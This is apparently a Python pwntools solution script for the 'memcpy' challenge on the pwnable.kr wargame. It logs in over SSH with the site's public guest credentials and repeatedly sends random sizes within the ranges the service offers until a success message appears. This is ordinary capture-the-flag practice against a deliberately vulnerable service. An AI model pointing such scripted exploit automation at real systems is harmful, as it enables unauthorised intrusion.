from pwn import *
import random

s = ssh('memcpy', 'pwnable.kr', port=2222, password='guest')

while True:
    try:
        p = s.remote('localhost', 9022)

        for i in range(10):
            n1, n2 = ''.join(re.findall(r'\d+ ~ \d+', p.recvuntil(b': ').decode())).split(' ~ ')
            # print(n1, n2)
            payload = random.randint(int(n1), int(n2))
            print(payload)
            p.sendline(str(payload).encode())

        output = p.recvall(timeout=3).decode()

        if 'helping my experiment' not in output:
            continue
        else:
            print(output)
            break
    except EOFError:
        print("Connection closed, reconnecting...")
        continue
    except Exception as e:
        print(f"An error occurred: {e}")
        break